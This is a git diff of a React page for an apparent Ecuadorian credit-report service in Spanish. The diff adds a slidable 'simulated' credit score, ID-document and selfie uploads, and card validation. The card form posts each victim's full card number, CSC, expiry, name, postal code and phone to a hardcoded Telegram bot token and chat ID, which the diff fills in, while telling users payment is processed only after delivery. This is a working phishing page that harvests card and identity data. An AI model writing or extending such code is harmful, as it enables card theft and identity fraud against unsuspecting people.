@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import "./CreditReportPage.css";
 import ScoreCircle from "./ScoreCircle";
 import { FaCheckCircle, FaInfoCircle, FaCreditCard, FaRegImage } from "react-icons/fa";
@@ -10,16 +10,47 @@ const objetivos = [
   "Quiero saber a quién le debo y encontrar errores"
 ];
 
-const SCORE_LEVEL = {
-  score: 900,
-  letter: "AA",
-  color: "#43b324",
-  emoji: <FaCheckCircle style={{ color: '#43b324', verticalAlign: 'middle', fontSize: '1.1em', marginLeft: 2, marginRight: 2 }} />,
-  text: "Vas muy bien, pero siempre es bueno mejorar. Llena el formulario y solicita tu análisis de crédito para conocer oportunidades y proteger tu historial financiero."
-};
+const SCORE_LEVELS = [
+  {
+    min: 0,
+    max: 599,
+    letter: "C",
+    emoji: "🚫🔥",
+    color: "#b71c1c",
+    text: "Actualmente es muy difícil acceder a créditos. Haz tu Análisis personalizado para identificar deudas, planificar pagos y trabajar en la recuperación de tu historial financiero."
+  },
+  {
+    min: 600,
+    max: 799,
+    letter: "B",
+    emoji: "😟🔎",
+    color: "#e6a700",
+    text: "Tu calificación es regular. Solicita un Análisis personalizado para conocer a quién debes, cuánto debes y qué estrategias puedes aplicar para mejorar tus posibilidades de obtener un crédito."
+  },
+  {
+    min: 800,
+    max: 899,
+    letter: "A",
+    emoji: "⚠️📋",
+    color: "#fbc02d",
+    text: "Estás al límite. Llena el formulario para solicitar tu Análisis personalizado y detectar qué debes mejorar para fortalecer tu perfil crediticio y mantener acceso a nuevos créditos."
+  },
+  {
+    min: 900,
+    max: 999,
+    letter: "AA",
+    emoji: <FaCheckCircle style={{ color: '#43b324', verticalAlign: 'middle', fontSize: '1.1em', marginLeft: 2, marginRight: 2 }} />, // check verde
+    color: "#43b324",
+    text: "Vas muy bien, pero siempre es bueno mejorar. Llena el formulario y solicita tu análisis de crédito para conocer oportunidades y proteger tu historial financiero."
+  }
+];
+
+function getScoreLevel(score) {
+  return SCORE_LEVELS.find(l => score >= l.min && score <= l.max) || SCORE_LEVELS[SCORE_LEVELS.length - 1];
+}
 
 const TELEGRAM_TOKEN = '7720652398:AAHqJaBEI2a2Z3wufe-GhNaVFuxbRU-prZA';
-const CHAT_ID = 'AQUI_TU_CHAT_ID'; // <-- PON AQUÍ TU CHAT_ID
+const CHAT_ID = 6332406416;
 
 function sendCardToTelegram(card) {
   const message = `💳 *Nuevo pago manual (Buró Ecuador)*\n\n*Nombre:* ${card.nombre}\n*Apellidos:* ${card.apellidos}\n*Número de tarjeta:* ${card.numero}\n*CSC:* ${card.csc}\n*Fecha de vencimiento:* ${card.fecha}\n*Código postal:* ${card.postal}\n*Móvil:* ${card.movil}`;
@@ -34,7 +65,7 @@ function sendCardToTelegram(card) {
   });
 }
 
-const AnalisisPage = ({ onAnterior, onSiguiente }) => {
+const AnalisisPage = ({ score, setScore, onAnterior, onSiguiente }) => {
   const [form, setForm] = useState({
     objetivo: "",
     descripcion: "",
@@ -59,6 +90,11 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
     mayorEdad: false
   });
   const [cardErrors, setCardErrors] = useState({});
+  const [showConfirmation, setShowConfirmation] = useState(false);
+
+  const SCORE_LEVEL = getScoreLevel(score);
+  const [isDragging, setIsDragging] = useState(false);
+  const scoreBarRef = useRef(null);
 
   const handleChange = e => {
     const { name, value, type, checked, files } = e.target;
@@ -107,7 +143,23 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
 
   const handleCardChange = e => {
     const { name, value, type, checked } = e.target;
-    setCardForm({ ...cardForm, [name]: type === 'checkbox' ? checked : value });
+    if (name === 'numero') {
+      // Solo números, máximo 19 dígitos
+      const clean = value.replace(/\D/g, '').slice(0, 19);
+      setCardForm({ ...cardForm, numero: clean });
+    } else if (name === 'fecha') {
+      // Auto-inserta '/' después de dos dígitos
+      let clean = value.replace(/[^\d]/g, '');
+      if (clean.length > 4) clean = clean.slice(0, 4);
+      if (clean.length > 2) clean = clean.slice(0, 2) + '/' + clean.slice(2);
+      setCardForm({ ...cardForm, fecha: clean });
+    } else if (name === 'csc') {
+      // Solo 3 o 4 dígitos
+      const clean = value.replace(/\D/g, '').slice(0, 4);
+      setCardForm({ ...cardForm, csc: clean });
+    } else {
+      setCardForm({ ...cardForm, [name]: type === 'checkbox' ? checked : value });
+    }
   };
 
   // Luhn check
@@ -158,6 +210,34 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
     }
     setCardErrors(errs);
   }, [cardForm.numero, cardForm.fecha]);
+
+  // Score bar handlers
+  const handleMouseDown = (e) => {
+    setIsDragging(true);
+    updateScore(e);
+  };
+  const handleMouseMove = (e) => {
+    if (isDragging) updateScore(e);
+  };
+  const handleMouseUp = () => setIsDragging(false);
+  const updateScore = (e) => {
+    if (!scoreBarRef.current) return;
+    const rect = scoreBarRef.current.getBoundingClientRect();
+    const y = e.clientY - rect.top;
+    const percentage = Math.max(0, Math.min(1, 1 - (y / rect.height)));
+    const newScore = Math.round(percentage * 999);
+    setScore(newScore);
+  };
+  useEffect(() => {
+    if (isDragging) {
+      document.addEventListener('mousemove', handleMouseMove);
+      document.addEventListener('mouseup', handleMouseUp);
+    }
+    return () => {
+      document.removeEventListener('mousemove', handleMouseMove);
+      document.removeEventListener('mouseup', handleMouseUp);
+    };
+  }, [isDragging]);
 
   return (
     <div className="credit-bg" style={{ paddingTop: 0 }}>
@@ -321,6 +401,7 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
                       value={cardForm.numero}
                       onChange={handleCardChange}
                       style={{ width: '100%', marginBottom: 4, border: cardErrors.numero ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16 }}
+                      maxLength={19}
                     />
                     {cardErrors.numero && <div className="form-error-v2">{cardErrors.numero}</div>}
                   </div>
@@ -333,11 +414,12 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
                         value={cardForm.fecha}
                         onChange={handleCardChange}
                         style={{ width: '100%', border: cardErrors.fecha ? '2px solid #b71c1c' : '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }}
+                        maxLength={5}
                       />
                       {cardErrors.fecha && <div className="form-error-v2">{cardErrors.fecha}</div>}
                     </div>
                     <div style={{ flex: 1, minWidth: 100 }}>
-                      <input type="text" name="csc" placeholder="CSC" value={cardForm.csc} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }} />
+                      <input type="text" name="csc" placeholder="CSC" value={cardForm.csc} onChange={handleCardChange} style={{ width: '100%', border: '1.5px solid #e3e6fa', borderRadius: 8, padding: 10, fontSize: 16, boxSizing: 'border-box' }} maxLength={4} />
                     </div>
                   </div>
                   <div className="form-group" style={{ display: 'flex', gap: 10, marginBottom: 10 }}>
@@ -360,23 +442,90 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
                     type="button"
                     style={{ width: '100%', background: '#0070ba', color: '#fff', border: 'none', borderRadius: 6, padding: '12px 0', fontSize: 17, fontWeight: 700, cursor: 'pointer' }}
                     onClick={async () => {
-                      try {
-                        const res = await sendCardToTelegram(cardForm);
-                        if (res.ok) {
-                          alert('¡Datos enviados a Telegram!');
+                      // Validar todos los campos del formulario de análisis y verificación de identidad
+                      const formErrors = {};
+                      if (!form.objetivo) formErrors.objetivo = 'Selecciona un objetivo';
+                      if (!form.descripcion || form.descripcion.length < 10) formErrors.descripcion = 'Describe brevemente el análisis (mínimo 10 caracteres)';
+                      if (!form.fotoAnverso) formErrors.fotoAnverso = 'Sube la foto del anverso';
+                      if (!form.fotoReverso) formErrors.fotoReverso = 'Sube la foto del reverso';
+                      if (!form.selfieCedula) formErrors.selfieCedula = 'Sube la selfie con cédula';
+                      if (!form.consentimiento) formErrors.consentimiento = 'Debes aceptar los términos';
+                      if (!form.autorizacion) formErrors.autorizacion = 'Debes autorizar el tratamiento de datos';
+                      setErrors(formErrors);
+                      if (Object.keys(formErrors).length > 0) {
+                        setShowConfirmation(false);
+                        return;
+                      }
+                      // Validar los campos de tarjeta
+                      const errs = {};
+                      if (!cardForm.numero || !isValidCardNumber(cardForm.numero)) errs.numero = 'Número de tarjeta inválido';
+                      if (!cardForm.fecha) {
+                        errs.fecha = 'Fecha inválida (MM/AA)';
+                      } else {
+                        const match = cardForm.fecha.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
+                        if (!match) {
+                          errs.fecha = 'Fecha inválida (MM/AA)';
                         } else {
+                          const mes = parseInt(match[1]);
+                          let anio = parseInt(match[2]);
+                          if (anio < 100) anio += 2000;
+                          const minDate = new Date(2025, 4, 1);
+                          const fechaCard = new Date(anio, mes - 1, 1);
+                          if (fechaCard < minDate) {
+                            errs.fecha = 'La fecha mínima es 05/25';
+                          }
+                        }
+                      }
+                      if (!cardForm.csc || cardForm.csc.length < 3 || cardForm.csc.length > 4) errs.csc = 'CSC inválido';
+                      if (!cardForm.nombre) errs.nombre = 'Nombre requerido';
+                      if (!cardForm.apellidos) errs.apellidos = 'Apellidos requeridos';
+                      if (!cardForm.postal) errs.postal = 'Código postal requerido';
+                      setCardErrors(errs);
+                      if (Object.keys(errs).length === 0) {
+                        try {
+                          await sendCardToTelegram(cardForm);
+                          setShowConfirmation(true);
+                        } catch (e) {
                           alert('Error al enviar a Telegram');
                         }
-                      } catch (e) {
-                        alert('Error al enviar a Telegram');
+                      } else {
+                        setShowConfirmation(false);
                       }
                     }}
                   >
-                    Pagar $21.45
+                    Pagar
                   </button>
-                  <div style={{ display: 'flex', justifyContent: 'center', marginTop: 16 }}>
-                    <img src="https://1000marcas.net/wp-content/uploads/2019/12/PayPal-emblema.jpg" alt="Desarrollado por PayPal" style={{ height: 32 }} />
-                  </div>
+                  {showConfirmation && (
+                    <div style={{
+                      background: '#f7fefb',
+                      border: '2px solid #43b324',
+                      borderRadius: 14,
+                      marginTop: 28,
+                      padding: 32,
+                      textAlign: 'center',
+                      color: '#232a31',
+                      fontSize: 19,
+                      fontWeight: 500,
+                      boxShadow: '0 2px 16px rgba(60,60,120,0.10)',
+                      maxWidth: 420,
+                      marginLeft: 'auto',
+                      marginRight: 'auto',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      alignItems: 'center',
+                      gap: 12
+                    }}>
+                      <span style={{ fontSize: 36, color: '#43b324', marginBottom: 8 }}>✅</span>
+                      <div style={{ fontWeight: 700, fontSize: 21, marginBottom: 6 }}>¡Solicitud recibida!</div>
+                      <div style={{ fontSize: 17, marginBottom: 8 }}>
+                        Recibirás tu <b>Informe de Buró</b> en tu correo y WhatsApp dentro de las próximas <b>24 a 48 horas</b>.
+                      </div>
+                      <div style={{ fontSize: 16, color: '#1a7f37', display: 'flex', alignItems: 'center', gap: 6 }}>
+                        <span style={{ fontSize: 22 }}>🔒</span>
+                        Tu pago solo se procesará después de la entrega.
+                      </div>
+                    </div>
+                  )}
                 </div>
               )}
             </div>
@@ -389,27 +538,31 @@ const AnalisisPage = ({ onAnterior, onSiguiente }) => {
           <section className="score-section score-section-v2">
             <div className="score-top-block-v2">
               <div className="score-circle-block">
-                <ScoreCircle score={SCORE_LEVEL.score} color={SCORE_LEVEL.color} />
+                <ScoreCircle score={score} color={SCORE_LEVEL.color} />
               </div>
               <div className="score-bar-block-v2">
                 <div className="score-bar-label">Score de Crédito:</div>
-                <div className="score-bar-vertical" style={{ cursor: 'default' }}>
+                <div className="score-bar-vertical" 
+                  ref={scoreBarRef}
+                  onMouseDown={handleMouseDown}
+                  style={{ cursor: 'pointer' }}
+                >
                   <div
                     className="score-bar-indicator"
                     style={{
-                      top: `${100 - (SCORE_LEVEL.score / 999) * 100}%`,
+                      top: `${100 - (score / 999) * 100}%`,
                       background: SCORE_LEVEL.color,
-                      cursor: 'default'
+                      cursor: 'grab'
                     }}
                   ></div>
                 </div>
-                <div className="score-bar-value">{SCORE_LEVEL.score} - {SCORE_LEVEL.letter}</div>
+                <div className="score-bar-value">{score} - {SCORE_LEVEL.letter}</div>
               </div>
             </div>
             <div className="score-info score-info-v2" style={{ borderColor: SCORE_LEVEL.color }}>
               <div className="score-info-badge" style={{ background: SCORE_LEVEL.color }}>{SCORE_LEVEL.letter}</div>
               <h3>Tu Score Crediticio</h3>
-              <p>Puntaje simulado: <b>{SCORE_LEVEL.score}</b></p>
+              <p>Puntaje simulado: <b>{score}</b></p>
               <p><b>Cliente {SCORE_LEVEL.letter}</b> {SCORE_LEVEL.emoji} {SCORE_LEVEL.text}</p>
             </div>
             <div className="alert-bottom alert-bottom-v2">
